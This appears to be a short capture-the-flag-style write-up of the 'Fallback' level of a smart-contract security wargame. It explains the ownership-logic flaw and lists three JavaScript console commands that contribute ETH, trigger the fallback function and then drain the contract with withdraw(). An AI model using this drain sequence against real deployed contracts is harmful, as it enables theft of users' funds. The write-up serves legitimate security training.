## 2. Fallback

The primary lesson here is that we should be mindful of the conditions we set in our contracts, and where we change ownership (or other crucial roles) based on said conditions and logic.

On a technical level, this level requires calling a contract function, unit conversion and sending Ether to contracts directly (to trigger the `receivable` function.) 

#### Solution

- `await contract.contribute({value: toWei("0.0001")})` to contribute `0.0001` ETH to the contract.
- ``` await web3.eth.sendTransaction({from: player,to:contract.address , value: toWei("0.00001")});``` to send eth to the contract in order to trigger the fallback function.
- `await contract.withdraw()` to drain the contract by sending all funds to `msg.sender`.
